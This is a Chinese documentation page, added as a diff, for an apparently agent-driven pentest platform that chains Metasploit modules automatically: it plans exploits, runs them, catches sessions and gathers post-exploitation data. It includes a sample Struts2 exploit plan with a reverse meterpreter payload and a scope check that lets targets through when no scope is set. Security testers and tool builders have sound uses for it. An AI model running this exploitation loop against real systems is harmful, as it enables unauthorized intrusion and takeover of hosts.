@@ -1,0 +1,141 @@
+# Metasploit 全自动闭环（msf）
+
+本页说明 ARTEX 如何把 **mcp-pymetasploit3**（Metasploit RPC 的 MCP 封装）接入 Worker，
+并用一个**确定性决策层**把「漏洞 → 模块 → 参数 → 执行 → 会话」串成可复现的闭环。
+
+```
+┌──────────── ARTEX Worker ────────────┐
+│ 1. msf_plan    （纯决策，无网络）      │  漏洞类别/目标 → 候选模块 + 参数 + 前置条件 + 失败分支
+│ 2. msf_execute （自动执行候选链）      │  连 MCP → use_module → set_option → execute → list_sessions
+│ 3. 写回 fact / 登记 ARTEX 会话        │  session id、主机、权限、可达网段
+└───────────────┬──────────────────────┘
+                │ stdio MCP (JSON-RPC)
+        ┌───────▼────────┐      msfrpc       ┌──────────────┐
+        │ mcp-pymetasploit3 │ ───────────────▶ │ msfrpcd (55553) │
+        └────────────────┘                  └──────┬───────┘
+                                                   │
+                                            Metasploit Framework
+```
+
+## 1. 安装与接入
+
+### 1.1 启动 Metasploit RPC
+
+```bash
+msfrpcd -P '<rpc-password>' -p 55553 -n
+# 或者：msfconsole -q -x 'load msgrpc Pass=<rpc-password> ServerPort=55553'
+```
+
+### 1.2 安装 MCP 服务
+
+```bash
+pip install mcp-pymetasploit3          # 或 uv tool install mcp-pymetasploit3
+```
+
+ARTEX 启动时会自动种入一条 **disabled** 的 MCP 配置：
+
+| name | transport | command | 说明 |
+|---|---|---|---|
+| `metasploit` | stdio | `mcp-pymetasploit3` | 需在「系统 → MCP」手动启用 |
+
+如果你的环境里命令不在 PATH（Windows 常见），把 command 改成
+`python`、args 改成 `["-m","mcp_pymetasploit3"]`，或写成 venv 的绝对路径。
+
+启用后点「发现工具」，确认能看到 `search_modules` / `use_module` / `set_module_option` /
+`execute_module` / `list_sessions` / `session_run_command` 等；并在**工具可见性**里把它们
+授权给 `worker`（MCP 工具默认不继承 host 工具绑定）。
+
+### 1.3 RPC 密码
+
+`msf_execute` 按以下顺序取密码：
+
+1. 入参 `rpc_password`
+2. 环境变量 `ARTEX_MSF_RPC_PASSWORD`
+3. 设置项 `msf_rpc_password`（`INSERT INTO settings(key,value) VALUES('msf_rpc_password','...') ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value;`）
+
+密码不会写进日志；MCP 的 `connect` 调用只在首次连接时发生。
+
+## 2. 决策层（`msf/`）
+
+决策是**纯函数**：同一输入永远得到同一 `plan_id`、同一候选顺序、同一分支，不依赖模型采样，
+因此 planner/worker 重启后可以重算同一计划。
+
+### 2.1 输入
+
+`vuln_class`（类别/产品/CVE 自由文本，内部归一化）、`host`、`port`、`service`、`url`、
+`lhost`/`lport`。类别归一化覆盖：struts2、log4j、weblogic、tomcat、spring、jenkins、shiro、
+activemq、solr、confluence、eternalblue(MS17-010)、bluekeep(CVE-2019-0708)、vsftpd、redis、
+ssh/mysql/mssql/smb 口令类。
+
+未命中内置类目时返回 `kind=search` + `suggested_search`，要求先用 `search_modules` 检索，
+**不猜模块名**。
+
+### 2.2 输出（节选）
+
+```json
+{
+  "plan_id": "msf-1a2b3c4d5e6f",
+  "kind": "exploit",
+  "class": "struts2",
+  "candidates": [
+    {"order":1,"module_type":"exploit","module":"exploit/multi/http/struts2_content_type_ognl",
+     "payload":"linux/x64/meterpreter/reverse_tcp",
+     "options":{"RHOSTS":"10.0.0.5","RPORT":"8080","TARGETURI":"/app/login.action","LHOST":"10.0.0.1","PAYLOAD":"..."},
+     "confidence":80,"rationale":"Content-Type OGNL 注入，覆盖 S2-045/S2-046 系"}
+  ],
+  "preconditions":["port_open:10.0.0.5:8080","module_exists: ...","callback_reachable:10.0.0.1:4444"],
+  "branches":[
+    {"on":"module_missing","do":"retry_next"},
+    {"on":"precheck_failed","do":"degrade"},
+    {"on":"no_session","do":"retry_next"},
+    {"on":"session","do":"post_session"},
+    {"on":"exhausted","do":"stop"}
+  ],
+  "session_post":["sysinfo / whoami","getuid","ipconfig / ifconfig","写回 fact"]
+}
+```
+
+### 2.3 失败分支（`msf_next`，确定性）
+
+| 观察结果 | 动作 | 语义 |
+|---|---|---|
+| `session` | `session` | 拿到会话 → 按 `session_post` 取证并写回 |
+| `module_missing` | `retry` | 当前 MSF 没有该模块 → 下一候选 |
+| `precheck_failed` | `degrade` | 前置条件不满足 → 转 check/辅助验证，写否定 fact |
+| `no_session` | `retry` | 模块跑完无会话 → 下一候选（换利用面/payload） |
+| `error` | `retry` | RPC/模块报错 → 下一候选 |
+| 候选耗尽 | `stop` | 写否定 fact（模块+参数+原因），禁止重复同一路径 |
+
+## 3. 工具契约
+
+| 工具 | 读 | 作用 |
+|---|---|---|
+| `msf_plan` | ✅ | 只读决策：候选模块、参数、前置条件、分支、取证步骤 |
+| `msf_next` | ✅ | 无状态分支选择：传同一目标 + `attempt` + `outcome`，返回下一步动作 |
+| `msf_execute` | ❌ | 全自动执行候选链：连 MCP → use_module → 设参 → execute → 轮询会话；返回 transcript 与 session id |
+
+`msf_execute` 的硬边界：
+
+- **scope 门**：目标必须落在任务已登记的 `task_scope` 内；任务没有任何 scope 时放行并记审计
+  （bootstrap 阶段），越界直接拒绝。
+- 只应在**漏洞已确认**之后调用；它不负责发现漏洞。
+- 每轮默认最多试 3 个候选（上限 8），等待会话默认 25s（上限 120s）。
+- 执行结果（含失败）应写回 fact，形成「尝试过什么」的可审计链路，避免 planner 重复派单。
+
+## 4. Worker 闭环用法
+
+1. `msf_plan` 拿计划（或 planner 已给出 `vuln_class`）。
+2. `msf_execute` 自动跑；返回 `sessions` 非空即成功。
+3. 对每个 session 用 MCP 的 `session_run_command` 执行 `session_post` 取证命令。
+4. 把「模块 / 参数 / 结果 / session id / 权限 / 可达网段」写成 fact；
+   若拿到的是可交互 shell，登记 ARTEX 会话（`register_session`）或按 MSF 会话继续操作。
+5. 失败则按 `action.kind`（retry/degrade/stop）处理，**不要**原样重试同一候选。
+
+## 5. 限制与注意事项
+
+- 模块路径随 MSF 版本变动；执行前会 `get_module_info` 校验，缺失自动走 `module_missing`。
+- 反弹 payload 需要目标能回连 `LHOST`；内网场景先建隧道再给 `LHOST` 为平台可达地址。
+- 高交互/加固目标可能「check 通但拿不到会话」，此时按 `degrade` 写否定结论，不无限重试。
+- 该闭环默认不走 ARTEX 的 `reverse_listen`/penelope；MSF 会话由 Metasploit 托管，
+  需要转入内网作业时用 `session_run_command` 或把凭据/拓扑写回资产图。
+- 合规：仅对授权目标使用；`msf_execute` 受任务 scope 硬校验，但使用者仍需自行确认授权。
